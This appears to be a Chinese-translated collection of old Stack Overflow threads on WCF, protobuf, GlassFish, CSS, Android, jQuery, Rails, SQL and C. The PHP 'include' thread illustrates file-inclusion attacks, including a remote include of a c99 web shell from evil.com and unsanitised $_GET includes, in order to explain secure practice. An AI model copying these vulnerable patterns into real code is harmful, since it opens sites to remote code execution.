此外，如果您有多个主要服务，您可以使用门户/路由器服务来决定将请求发送到哪个主要服务，使用对它们的多个服务引用，并使用代理继续发送作业。它真的很好用。

它基本上是一个手动的前端路由服务，但美妙的是，详细的工作可以在线程模型的主要服务中完成，而看门的工作可以在门户/路由器上完成，因此只发送实际请求到主要服务，允许他们只做工作，门户服务决定他们如何或是否获得工作。下一步我想添加它自动发现新服务，但目前，手动配置工作正常。

如果有人想查看并请求它，我可以发布我想出的源代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T06:19:38.487

根本问题是路由器对服务正在使用的服务合同一无所知——它使用通用合同（使用 Message 类型的合同）。因此，路由器无法为客户端自动生成元数据。

您需要做的是自己提供元数据，可能作为静态 WSDL 文档，其中包含正确的地址并将客户端指向此

# c# - 访问协议缓冲区字段的简单方法

> ID：10148317
> 
> 赞同：1
> 
> 时间：2012-04-13T21:06:07.520
> 
> 标签：c#, protocol-buffers

有这样的 .proto 文件结构

```
{
    session{
    field1 = value;
    field2 = value;
    ...
    }
object1{
    Object1field1 = value;
    Object1field2 = value;
    ...
}
object1{
    Object1field1 = value;
    Object1field2 = value;
    ...
}
object2{
    Object2field1 = value;
    Object2field2 = value;
    ...
    SubObject1{
    SubObject1field1 = value;
    SubObject2field2 = value;
    ...
    }
}    object2{
    Object2field1 = value;
    Object2field2 = value;
    ...
    SubObject1{
    SubObject1field1 = value;
    SubObject2field2 = value;
    ...
    }
} 
```

} 简单地说具有复杂的层次结构。例如，Object1 或 Object2 可以是可重复的。是否可以编写通用方法，将字段值作为基本对象（如 int、bool、string、datetime 或简单的字符串）返回？我想通过字符串文字获得以下访问权限：

```
public object GetFieldValue(int number, string fullPath) 
```

例如，可以像这样指定 fullPath 的位置：

```
fullPath = "object1.Object1field1"; 
```

重复字段所需的数字：例如，对于第一个“object1”，number 可以等于 0，对于第二个“object1”可以等于 1。获取 object1 的必要方法也是按字段名称重复计数：

```
public int GetFieldCount(string fieldName) 
```

并且还需要类似的方式来访问子对象到任何嵌套级别。那可能吗？是否有替代协议缓冲区硬编码类的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-16T05:31:16.650

与 xml/protobuf 对话有关；我的*理解*是 protobuf-csharp-port 使用不可变类型，因此不适用于 XmlSerializer 之类的东西。相比之下，protobuf-net 故意开始使用标准可变 POCO 类型，无论是您现有的 DTO，还是通过 protoprotogen 从 .proto 生成；无论哪种方式，我们最终都会生成一个类似的类型：

```
[ProtoContract]
public class Foo {
    [ProtoMember(1)]
    public string Name {get;set;}
    [ProtoMember(2)]
    public Bar Something {get;set;}
}
[ProtoContract]
public class Bar {
    [ProtoMember(1)]
    public int Id {get;set;}
} 
```

（给予或采取一些复杂性）

然后从 protobuf 流转换为 xml 很简单：

```
Foo foo;
using(var source = ...) {
    foo = Serializer.Deserialize<Foo>(source);
}
string xml;
using(var sw = new StringWriter()) {
    var ser = new Serializer(typeof(Foo));
    ser.Serialize(sw, foo);
    xml = sw.ToString();
} 
```

现在`xml`是实例`XmlSerializer`中相同数据的表示`Foo`（以及任何子数据，例如`Bar`）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-16T12:40:49.597

顺便说一句，如果您将您的代码生成扩展为如下所示：

```
[ProtoContract]
public class Foo : IGetFieldsByName {
    [ProtoMember(1)]
    public string Name {get;set;}
    [ProtoMember(2)]
    public Bar Something {get;set;}
}
[ProtoContract]
public class Bar : IGetFieldsByName {
    [ProtoMember(1)]
    public int Id {get;set;}
} 
```

即从同一接口 IGetFieldsByName 继承所有类？然后很容易实现我喜欢的行为：通过“object.name”字面量访问字段。你有什么想法？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-17T17:01:25.603

嗯...肯定 protobuf-csharp-port 具有此任务所需的一切，例如：

```
IMessage object2 = (IMessage)original[original.DescriptorForType.FindFieldByName("object2"), 0];
IMessage subObject1 = (IMessage)object2[object2.DescriptorForType.FindFieldByName("SubObject1")];
int value = (int)subObject1[subObject1.DescriptorForType.FindFieldByName("SubObject1Field1")]; 
```

**作为从IMessage**派生的所有类型。将回到它。;)

# glassfish - 无法卸载 GlassFish 3

> ID：10148323
> 
> 赞同：0
> 
> 时间：2012-04-13T21:07:05.117
> 
> 标签：glassfish, uninstallation

好的，这是交易：

我试图安装 java jdk，以便我可以在这台计算机上的 eclipse 中处理一个 android 项目，但是有这么多不同的 java 安装，至少对我来说，要弄清楚我需要哪个是不可能的。所以我选择了“JDK 7u3 with Java EE”。但这也安装了 GlassFish 的东西，我不知道它是什么或它做了什么，当我经历所有 eclipse 的东西时，我决定让我的另一台电脑继续工作。所以我删除了eclipsed和所需的东西，我删除了java的东西，但是当我尝试卸载GlassFish时，它不能，并给我错误：

“在‘​​(null)’中找不到所需的 Java(TM) 2 运行时环境版本。”

我现在已经尝试了几个小时，在网上搜索以找出一些删除它的方法，安装各种 java 东西，再次删除它，重新安装，但没有任何效果。我真的不在乎 GlassFish 是什么或它做什么，我只是想要它，而所有 java 的东西都一去不复返了。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-10-03T13:05:26.083

在 Microsoft Windows 7（或其他）下，使用该命令行：

卸载.exe -j "%JAVA_HOME%"

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-26T16:38:25.300

您首先安装了 jdk1.6，然后将其卸载。在这一次，你安装 glassfish3 和 glassfish`set AS_JAVA=C:\Program Files (x86)\Java\jdk1.6.0_x`在它的配置文件中写但是你现在使用 jdk1.7

1.  打开 C:\glassfishv3\glassfish\config\asenv.bat
2.  搜索“设置 AS_JAVA”
3.  将其值更改为您当前的 jdk 路径（例如 C:\Progra¨1\Java\jdk1.7.xx ）
4.  再次尝试卸载。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-05-20T09:26:40.540

您可以运行卸载指定要使用的 jvm：

尝试以下**命令**卸载

```
C:\glassfish3\uninstall.exe -j <java home dir> 
```

如错误消息中所述。它对我有用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-08-15T16:07:58.067

这些对我在 Windows 7 中运行 java 1.6.0_24 不起作用：

*   我尝试修改 glassfish 用来查找 jre 以指向我的 jre 的 asenv.bat 文件。
*   我尝试手动将其放入 C:\glassfish3\uninstall.exe -j 中。这是根据官方 Oracle 文档。

唯一有效的是使用原始路径并将 bin 和 lib 文件夹从我的 java 安装移动到错误对话框指定的目录。然后 Glassfish 卸载启动并顺利完成。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-14T20:05:13.383

GlassFish 是一个以开源方式开发的 Java EE 应用程序服务器，因此您可以创建您的 android 应用程序可以使用的服务器端服务。当然，听起来您对此并不真正感兴趣:-)

Java EE SDK 安装/卸载说明在这里：http: [//java.sun.com/javaee/sdk/javaee6sdk_install.jsp](http://java.sun.com/javaee/sdk/javaee6sdk_install.jsp)

您可能想要下载的 Java 7 SDK (JDK 7) 在这里：[http ://www.oracle.com/technetwork/java/javase/downloads/index.html](http://www.oracle.com/technetwork/java/javase/downloads/index.html)

确保您下载的是 JDK（Java 开发者工具包）而不是 JRE（Java 运行时环境）。

希望这可以帮助。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-03-07T15:40:08.613

我能够使用以下命令卸载 glasshfish 服务器

卸载.exe -javahome "%JAVA_HOME%"

注意：我们需要在环境变量和classpath变量中设置JAVA_HOME

# html - 如何让一个div展开

> ID：10148324
> 
> 赞同：0
> 
> 时间：2012-04-13T21:07:05.830
> 
> 标签：html, css

我已经尝试过清除，设置特殊高度和各种方法，所以这就是问题所在。

我的包装器有一个 bg，但是如果内容扩展它就不会滚动。目前有两种情况，如果高度设置得太 100%，那么背景会停在屏幕底部所在的像素线处，然后没有图像，如果没有高度，则 bg 会停在屏幕底部的一半以上页面这是一些CSS：

```
body {
    font-family:Arial, Helvetica, sans-serif;
    margin: 0;
    height: 100%
    padding: 0;
    background-color:#9B9D9E;
}

#container{
    width:1260px;
    margin: 0 auto;
}

#wrapper{
    background-image:url(../images/bg.png);
    background-repeat: repeat-y;
    height: 100%;
    width: 1260px;
    float: left;
    position:absolute;
} 
```

jsfiddle：http: [//jsfiddle.net/PqRhT/](http://jsfiddle.net/PqRhT/)

屏幕截图：[http ://tinypic.com/r/orjyw6/5](http://tinypic.com/r/orjyw6/5)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-19T18:03:59.840

你有没有尝试过：

```
#div:hover {hover is just one type of selector} 
```

或者

```
#div:hover #divOther {results in effecting another element} 
```

# php - PHP - “包含”功能安全吗？

> ID：10148328
> 
> 赞同：10
> 
> 时间：2012-04-13T21:07:34.303
> 
> 标签：php, include

我正在使用“include”函数（例如“include 'header2.php'”或“include 'class.users.php'”）在我的网站中添加标题或会话类。我真的不记得在哪里，但我听说黑客滥用了，不知何故，这个“包含”的东西，发送虚假的包含页面或类似的东西。所以基本上我想知道那个“包含”功能是什么，我该如何保护它，他们如何滥用它以及是否有更好的解决方案来解决我正在寻找的问题。

提前致谢。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-13T21:15:08.437

这完全取决于您如何实现它。如果您专门设置了路径，那么它是安全的。如果您允许用户输入来确定文件路径而不进行清理或检查，则可能会发生攻击。

**不安全**（目录遍历）

```
<?php 
include($_GET['file']);
?> 
```

**不安全**（[URL fopen](http://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen) - 如果启用）

```
<?php 
include('http://evil.com/c99shell.php');
?> 
```

**不安全**

```
<?php 
include('./some_dir/' . $_GET['file']);
?> 
```

**部分不安全（*.php 文件易受攻击）**

```
<?php 
include('./some_dir/' . $_GET['file'] . '.php');
?> 
```

**安全**（虽然不知道为什么有人会这样做。）

```
<?php 
$allowed = array(
    'somefile.php',
    'someotherfile.php'
);

if (in_array(basename($_GET['file']), $allowed)) {
    include('./includes/' . basename($_GET['file']));
}
?> 
```

**安全的**

```
<?php 
include('./includes/somefile.php');
?> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-13T21:13:37.263

包含的最大问题可能是将**文件扩展名**从 PHP 更改为不会由 Web 服务器自动执行的内容。例如 - library.inc 或 config.inc。使用 Web 浏览器调用这些文件将显示代码而不是执行它 - 并且将显示任何密码或可利用的提示。

将可能包含密码的**config.php与****config.inc**进行比较。在大多数情况下，拉起 config.inc 会显示数据库密码是什么。

有些程序员对库使用 .inc 扩展名。前提是它们不会位于 Web 服务器可访问的目录中。但是，安全性较低的偏执程序员可能会将该文件转储到方便的 Web 目录中。

否则，请确保您不包含以某种方式由查询字符串提交的文件。例如：`include( $_GET['menu_file'] )`<--这是非常错误的。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-13T21:12:26.877

如果您执行以下操作，可能会滥用包含：

```
include($_GET["page"]); 
```

然后调用 URL：

`myscript.php?page=index.php`

然后攻击者可以替换它`index.php`，`hxxp://hackerz.ru/install_stuff.php`您的服务器将很乐意运行它。

`include`本身是完全安全的。只要确保始终验证/转义您的输入。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-13T21:13:57.557

任何服务器端（假设您的服务器没有受到威胁）都是安全的。这样做：

```
$var = $_GET['var']';    
include $var . ".php"; 
```

是不安全的。

```
include "page.php"; 
```

是安全的。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-04-13T21:12:19.530

如果您不这样做，包含是安全的：

1.  包括一个远程文件，如`www.someoneelsesssite.com/something.php`
2.  包含来自客户端的路径中的文件。`www.mysite.com/bad.php?path=oops/here/is/your/passwords/file`
3.  包括来自另一个可能被污染的来源（如数据库）的文件。

2 和 3 从技术上来说有一个警告，如果你禁止`.`or`/`或者在 windows 上`\`你可能没问题。但是如果你不知道为什么，你就没有足够的了解去冒险。即使您认为数据库是只读的或其他安全的，明智的做法是不要假设，除非您真的必须这样做，这几乎从来没有。

正如 pp19dd 的回答所指出的那样。使用 .php 扩展名命名包含也很重要。如果您已设置 apache（或您使用的任何 Web 服务器）也将另一种文件类型解析为 PHP，那也是安全的。但如果您不确定，请仅使用 .php。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-13T21:12:37.093

最好的办法是确保您尝试包含的页面首先存在。当您的包含页面是从某种用户输入（例如 URL 变量）处理时，真正的安全漏洞就出现了。`?include=page.php`只要你小心这些，你应该没问题。

```
if(is_file($file)) {
    //other code, such as user verification and such should also go here
    include $file;
}
else { die(); } 
```

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2015-07-02T17:48:57.067

我正在使用这种方法。

```
<?php include (dirname(__FILE__).'/file.php'); 
```

# c# - 基于两个字段记住密码

> ID：10148330
> 
> 赞同：1
> 
> 时间：2012-04-13T21:07:49.527
> 
> 标签：c#, javascript, asp.net, .net

通常，登录页面包含两个文本框，一个用于用户名，另一个用于密码

在我们正在开发的 Asp.net 3.0 SaaS 产品中，有三个文本框：1）客户名称、2）用户名和 3）密码。

登录页面上有复选框，即记住密码

现在写它基于用户名运行（就像正常的登录页面一样）

我想为客户名和用户名的组合保存密码，而不仅仅是基于用户名，因为两个客户的用户名可以相同。

是的，我把它留在浏览器上，它在填写用户名并移出文本框后自动填充密码，它工作正常。

我希望根据用户名和客户名填写密码文本框。

如何实现这一点，任何方法都可以，但它应该按要求工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T02:38:43.770

您可以将您的用户名/客户名称和密码存储在 cookie 中，这是一种浏览器功能。然后在从 cookie 加载页面时检索这所有三个文件 ..

# android - Android - 我如何在加载进程后*执行代码

> ID：10148333
> 
> 赞同：1
> 
> 时间：2012-04-13T21:08:09.970
> 
> 标签：android

基本上，当在我的应用程序中按下菜单项时，它会将用户带到一个新屏幕。但是现在我想在线获取一些数据（时间/日期），一旦获取数据，这些数据就会显示在页面的某个位置。目前，新屏幕不会加载，直到应用程序获取数据，这会留下几秒钟的暂停，而不是立即加载屏幕，然后在最终获得下载的数据时显示下载的数据。

我尝试使用 onStart 方法，因为它在 onCreate 之后被调用，所以我认为页面将被创建并显示，然后 onStart 被调用但没有发生，它加载之间仍然存在延迟，因为它让数据在线然后显示页面它已经加载了。

我该如何排序？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:21:59.833

对于任何类型的加载操作，您都应该考虑将 与[`AsyncTask`](http://developer.android.com/reference/android/os/AsyncTask.html)结合使用[`ProgressDialog`](http://developer.android.com/reference/android/app/ProgressDialog.html)，以便通知您的用户您正在后台执行某些操作。

[`onPreExecute()`](http://developer.android.com/reference/android/os/AsyncTask.html#onPreExecute%28%29)请记住，[`onPostExecute()`](http://developer.android.com/reference/android/os/AsyncTask.html#onPostExecute%28Result%29)您只能在`AsyncTask`.

因此，在您的情况下，您可能希望在`onCreate()`Activity 的方法中触发 AsyncTask，在方法中显示 ProgressDialog，`onPreExecute()`然后显示您的信息并将 ProgressDialog 隐藏在`onPostExecute`.

要消除您所说的这种滞后几乎是不可能的。所以你最好只是适当地处理它。

希望这有助于回答您的问题。

# jquery - Ajax post 函数重新加载页面而不是动态地发送数据

> ID：10148336
> 
> 赞同：0
> 
> 时间：2012-04-13T21:08:16.343
> 
> 标签：jquery, html, ajax, forms

我对一些 JQuery 代码有一些问题，我不知道问题是什么，基本上我试图使用 ajax 即时提交评论，但由于某种原因页面不断重新加载。看看下面的代码...

**html表单**

```
<form method='post' action=''>                      
   <textarea name='comment' id='comment' maxlength='500'>Leave a Comment...</textarea>
   <input name='userActivityId' id='userActivityId' type='hidden' value='$userid'>

   <input class='send' id='formButton' type='submit' value='Send'>
</form> 
```

**jQuery 代码**

```
$(function(){

   /*this function submits a normal comment from the comment container*/
   $(".commentContainer .send").on('click', function(){     
      var profileId = $("input#userActivityId").val();
      var comment = $("textarea#activityComment").val();    

      if(profileId == ""){
         $("input#userActivityId").focus();
         return false;
      } 

      if(comment == ""){
         $("textarea#comment").focus();
         return false;
      } 

      //send message
      postActivityMessage(comment, profileId);

      return;
   });

   function postActivityMessage(comment, toUser){
      $.ajax({
         type: "POST", url: "include/process.php", 
         data:{
            addActivityComment: "true",
            message: comment,
            userActivityId: toUser,
            type: "message",
            replyto: '0'    
         },
         success: function(){
            alert('posted');
         }
      });
   }

}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:14:52.503

根据戴夫的评论，这应该会有所帮助

```
$("form").submit(function(e) {
    e.preventDefault();
}); 
```

# ruby-on-rails - 调整日期时间

> ID：10148340
> 
> 赞同：0
> 
> 时间：2012-04-13T21:08:28.577
> 
> 标签：ruby-on-rails, ruby, time

我有两个`ActiveSupport::TimeWithZone`对象，比如说`t1`和`t2`。更改小时和分钟`t2`以匹配的最佳方法是什么`t1`？例如，假设`t1`是 2012 年 4 月 2 日下午 3:45 和 2012 年`t2`4 月 15 日下午 6:00。我想`t2`在下午 3:45 更改为 2012 年 4 月 15 日。

我对也适用于`Time`对象的解决方案感到满意。

到目前为止我有这个：

`Time.zone.parse "#{t1.strftime "%Y-%m-%d"} #{t2.strftime "%H:%M:%S"}"`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T11:37:28.127

这应该这样做：

```
t2.change(hour: t1.hour, min: t1.min) 
```

[文档。](http://as.rubyonrails.org/classes/ActiveSupport/CoreExtensions/Time/Calculations.html#M000192)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T23:41:03.900

通常你只需要使用 Time.mktime。不过，整个 ActiveSupport::TimeWithZone 有点乏味。对于 ActiveSupport::TimeWithZone，我建议：

```
t1 = Time.mktime(2012,4,15,18)
t2 = Time.mktime(2012,4,15,15,45)
t3 = Time.mktime(t1.year, t1.month, t1.day, t2.hour, t2.min, 0, 0, Time.zone.utc_offset).in_time_zone(Time.zone) 
```

在纯红宝石中，您只需执行第一部分：

```
t1 = Time.mktime(2012,4,15,18)
t2 = Time.mktime(2012,4,15,15,45)
t3 = Time.mktime(t1.year, t1.month, t1.day, t2.hour, t2.min) 
```

至于性能差异，mktime（包括 .in_time_zone 的东西）在这里大约快 15 倍（Time.zone.parse 需要 0.49 毫秒，Time.mktime 需要 0.03 毫秒）。

希望有帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T21:56:05.147

不确定您到底要做什么，但是可以直接添加或减去 Time 对象（秒是默认的时间单位，但在这种情况下并不重要）。假设 t2 是一个 Time 对象，这个简单的代码将为您提供与 t1 匹配的时间的更新 t2：

```
t2 = 2012-04-15 18:00:00 -0400 # This is how a Time object is displayed in irb
t2 = t2 - (t2 - t1) # I did this in irb with require 'active_support', but it should work in Rails 3.x. 
```

我对 Rails 比较陌生，所以如果我过于简单，请原谅我，但我希望这能解决你的问题。

# sql - SQL 查询和连接

> ID：10148345
> 
> 赞同：-2
> 
> 时间：2012-04-13T21:08:48.013
> 
> 标签：sql, join

请在下面查看我的查询：

```
select I.OID_CUSTOMER_DIM, I.segment  as PISTACHIO_SEGMENT,
   MAX(CASE WHEN S.SUBSCRIPTION_TYPE = '5' THEN 'Y' ELSE  'N' END ) PB_SUBS,
   max(case when S.SUBSCRIPTION_TYPE ='12' then 'Y' else 'N' end) DAILY_TASTE,
   MAX(CASE WHEN S.SUBSCRIPTION_TYPE ='8' THEN 'Y' ELSE 'N' END) COOKING_FOR_TWO
FROM WITH_MAIL_ID i   JOIN CUSTOMER_SUBSCRIPTION_FCT S
ON I.IDENTITY_ID = S.IDENTITY_ID 
WHERE S.SITE_CODE ='PB'and S.SUBSCRIPTION_END_DATE is  null
group by I.oid_customer_dim, I.segment 
```

在这一行中，我得到了 654105 行，低于`with_mail_id`具有 706795 行的连接表之一。

现在，出于质量控制的目的，我的经理想知道为什么我的最终表格中没有所有行。我试图删除所有过滤器，但两个表中的结果仍然不同。我究竟做错了什么？

我的 SQL 还不是很好，这件事让我很困惑。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:14:45.120

您正在对两个表进行[内部连接](http://en.wikipedia.org/wiki/Join_%28SQL%29#Inner_join)，因此只会返回 WITH_MAIL_ID 中可以连接 CUSTOMER_SUBSCRIPTION_FCT 的行。此外，您还有一个 group 子句。

首先是加入。如果您想返回所有行而不考虑连接条件，您可以使用[左连接](http://en.wikipedia.org/wiki/Join_%28SQL%29#Left_outer_join)，但在这种情况下，所有 S. 列都将为 NULL，您必须处理它。

如果你运行它，你可能会看到计数是不同的：

```
select count(*) from WITH_MAIL_ID i
left join CUSTOMER_SUBSCRIPTION_FCT S 
    on I.IDENTITY_ID = S.IDENTITY_ID
where s.IDENTITY_ID is NULL 
```

然而，最有可能的是它只是分组。如果您在两列上进行分组并根据该分组选择各种其他列的最大值，您会期望返回的行数少于原始表，否则为什么还要麻烦分组？

如果我有这样的数据：

```
groupkey1  value
1          2
1          10
2          1
2          1 
```

然后我按 groupkey1 分组，然后选择 MAX(value) 我会得到 2 行`[1,2], [2,1]`，而不是 4 行。

# php - Joomla _JEXEC 之类的功能

> ID：10148348
> 
> 赞同：0
> 
> 时间：2012-04-13T21:08:59.187
> 
> 标签：php, joomla

我正在尝试制作某种形式的 CMS 用于学习目的。现在我想了解如何将一堆类自动包含到某些文件中。我想编写一行代码，其中包含我想要的所有类。

```
<?php include(realpath($_SERVER["DOCUMENT_ROOT"])."/lib/php/session.inc.php");

Essentials::getDOCTYPE();
Essentials::getHeader(); 
```

这是我的索引文件顶部的样子。如何自动包含该会话文件？据我所知，Joomla 中的 _JEXEC 定义了一个自定义 Joomla 会话，然后在使用之后立即使用了 $this->baseURL() ，这意味着有一个以某种方式使用的类。但是，没有 include("myclass.php");

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T23:45:52.533

Joomla 文件中的 _JEXEC 并没有你想象的那么聪明。它只是一个在主脚本的入口点 (index.php) 中定义的常量。然后在后续文件中测试它的存在，作为防止文件被直接访问的安全预防措施。

如果 _JEXEC 未定义，则您没有通过 index.php 进入 - 如果您直接请求 index.php，或者通过 mod_rewrite 静默重定向（重写）到 index.php，则定义了 _JEXEC，否则您必须访问另一个文件直接退出，脚本以“不允许直接访问”类型的消息退出。

我相信您正在谈论的功能可以通过基于单词“php autoload”的搜索找到，您可以构建一个函数，该函数将在特定文件夹中查找名称与您定义的模式匹配的文件，其中包括您所定义的类的名称尝试实例化但尚未加载。

# android - onCreateOptionsMenu 没有出现

> ID：10148352
> 
> 赞同：1
> 
> 时间：2012-04-13T21:09:24.930
> 
> 标签：android, menu, tabs

我的应用程序有这样的东西：

```
TabActivity
    Tab 1 (ActivityGroup)
        Activity > Activity > MapActivity
    Tab 2 (ActivityGroup)
        MapActivity 
```

问题是在**Tab 2 MapActivity**中，选项菜单没有出现，甚至显示错误。但在第一个**MapActivity**中完美运行。我在方法中放置了一个断点，`onCreateOptionsMenu`但甚至输入了它。

我使用本[教程](http://androidgenuine.com/?p=375)使我的应用程序基于 TabHost。

任何人都可以帮助我知道为什么在一个有效而另一个无效？

提前致谢。

**更新**

关于版本：

```
<uses-sdk android:minSdkVersion="10" android:targetSdkVersion="13" /> 
```

第一个 MapActivity 类：

```
public boolean onCreateOptionsMenu(Menu menu) {
    menu.add(0, 0, 1, "Nearest");
    menu.add(0, 1, 1, "Directions");
    return true;
} 
```

第二个 MapActivity 类：

```
public boolean onCreateOptionsMenu(Menu menu) {
    menu.add(0, 0, 1, "Nearest");
    menu.add(0, 1, 1, "Region");
    return true;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T21:23:03.673

基本上`TabHost`只有一个选项菜单。

我没有测试过它，但我的猜测是它只是使用第一个从`onCreateOptionsMenu`. 如果您想为每个选项卡设置不同的选项菜单，则必须做几件事：

1) 子类化`TabHost`和覆盖`onCreateOptionsMenu`and `onPrepareOptionsMenu`。

2）当标签更改时（不记得您如何侦听此事件，Google It），调用`invalidateOptionsMenu`，这将迫使呼叫`onPrepareOptionsMenu`。

3) 在`onPrepareOptionsMenu`中，记得调用`menu.clear()`，然后执行您在`onCreateOptionsMenu`创建选项卡特定选项菜单时所做的正常菜单膨胀操作。

# javascript - 用于隐藏警报框的 Javascript cookie

> ID：10148354
> 
> 赞同：1
> 
> 时间：2012-04-13T21:09:42.880
> 
> 标签：javascript, android, iphone, cookies, alert

好的，我浏览了整个互联网，但找不到我想要的东西：

我有一个仅向 iPhone/android 用户发送 javascript 警报的页面，并为他们提供访问移动网站的选项（如果他们单击取消，则会显示另一个警报框，告诉他们如何访问移动网站）。

但是，如果你每次都去那个网站，这很烦人，而且每次都必须点击取消（这只对一直点击取消的人来说很烦人），所以，我可以得到一个 cookie 记住你点击了取消和例如一个月不会再次显示弹出窗口？

我不希望它记住选择（也许点击同意的用户想要切换回来但又自动被重定向）但只是不再显示确认框......

我怎样才能做到这一点？

# c - malloc(sizeof(s)) 分配的内存比预期的少？

> ID：10148357
> 
> 赞同：2
> 
> 时间：2012-04-13T21:10:04.617
> 
> 标签：c, malloc

嘿，我在 malloc 中使用 sizeof 运算符时遇到问题。例如见下文。代码-

```
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
char * copy(char *s)
{
    char *t=malloc(sizeof(s));
    char *ptr=s;
    int i=0;
    do
    {
        t[i++]=*ptr++;
    }
    while(*ptr!='\0');
    return t;
}
int main()
{
    char *s="hello adsjahsjkdhjkashdkjaskdasldjlasjdlajsdlkjaslkdjalsjdlasjdljasdljasdkljklsdjlasdsadasdasd";
    char *b=copy(s);
    printf("%s\n",b);
    free(b);
    return 0;
} 
```

在 ideone 上，它给出了错误：- *** 检测到 glibc****./prog: free(): 下一个尺寸无效（快速）：0x09bcf008 ** **

 *但是当我用 malloc(strlen(s)+1) 替换 malloc(sizeof(s)) 时，程序运行良好。所以有什么问题？注意：这只是我创建的一个小程序，用于演示我在另一个代码中遇到的问题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-13T21:11:14.633

运算符`sizeof`不会对指针执行您想要的操作。它会产生您机器上指针的大小（大概是 4 或 8）。

您可以这样想：数组在传递给函数时衰减为指针，并且有关其大小的信息“丢失”。

* * *

另请注意，您的循环未填写 0 终止符。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-13T21:11:30.920

您应该在函数中使用[strlen](http://www.cplusplus.com/reference/clibrary/cstring/strlen/)而不是[sizeof](http://msdn.microsoft.com/en-us/library/0w557fh7%28v=vs.80%29.aspx)`copy`：

```
char * copy(char *s)
{
    char *t=malloc(strlen(s) + 1);
    char *ptr=s;
    int i=0;
    do
    {
        t[i++]=*ptr++;
    }
    while(*ptr!='\0');
    return t;
} 
```

问题是它`sizeof`不返回您需要的值，该函数将返回`char *s`（可能是 4 或 8 -> 用于存储该指针的字节）的大小。检查文档链接以更清楚地理解。

还有一件事，如果你这样做是为了练习你的 C 技能是可以的，但如果你不是，你可能只想使用[strcpy](http://www.cplusplus.com/reference/clibrary/cstring/strcpy/)函数。

希望能帮助到你。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-13T21:12:00.840

当作为参数传递给函数时，具有大小信息的数组和字符串会退化为失去其大小属性的指针

因此，当您计算参数的大小时，`s`它会根据您的位数返回 32/64。

而不是`sizeof`，您实际上应该这样做`strlen`并向其添加一个以容纳空字符。

代替

```
char *t=malloc(sizeof(s)); 
```

尝试

```
char *t=malloc(strlen(s)+1); 
```

请注意：

您的代码还有其他设计问题

1.  当传递不应更改的指针参数时，应将其声明为 const。

2.  通常，如果 cal-lee 忘记释放存储，则返回本地生成的堆存储的地址不是一个好习惯，并且是内存泄漏的主要原因。而是将其作为非常量参数传递给函数。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-04-13T21:12:34.740

`sizeof(s)`返回其大小`char *s`为 4（在 32 位上）或 8（在 64 位上）系统。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-13T21:12:57.183

`sizeof`返回指针的大小（通常为 4 或 8 个字节），而不是指向对象的大小。（没有办法获得后面的信息。顺便说一句， `sizeof`实际上是一个编译时常量。）

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-13T21:14:13.910

`s`是一个指向 char 的指针，因此`malloc(sizeof(s))`为一个指向 char 的指针分配空间——通常是 2-8 个字节，最常见的是 4 个字节。就目前而言，无论您传入的字符串长度如何，它都会始终分配这个固定数量的空间。在您的测试中，您传递的字符串比这长得多，因此您会溢出分配的缓冲区。

你已经给出了正确的答案：在这种情况下，`strlen`找到大小的函数是正确的。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-02-03T06:32:42.667

malloc 在 中声明，因此我们在任何调用 malloc 的程序中#include 那个头文件。根据定义，C 中的“字节”是适合存储一个字符的存储量，因此上述 malloc 调用为我们提供了与我们要求的一样多的字符。我们可以这样说明生成的指针：*

# c# - 将值传递给控制器 动作

> ID：10148365
> 
> 赞同：1
> 
> 时间：2012-04-13T21:10:53.460
> 
> 标签：c#, javascript, jquery, asp.net-mvc

我正在尝试使用 jQuery 将两个值传递给以下控制器操作

```
[HttpPost]
        public JsonResult Cancel(Guid Id, string cancelReason)
        {
            //do something
        } 
```

.js：

```
 CancelProgram = function (Id) {
//this is basically the value from a select tag placed on the form            
var reason = $("#CancelReasons").val();
            alert(reason);

            Origin.ajax({
                url: '/ZYX/Cancel?Id=' + Id,
                type: 'POST',
                dataType: 'json',
                data: { cancelReason: reason },
                success: function (data) {
                    alert('success!');
                }
            });
        };
    }); 
```

action 方法中的 cancelReason 的值始终为 null。关于为什么这不起作用的任何指示？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T21:40:00.090

您的代码的另一部分一定有问题。我将首先通过硬编码值并确保它们被正确发送来发送正常的 AJAX 请求：

```
$.ajax({
    url: '/ZYX/Cancel',
    type: 'POST',
    data: { 
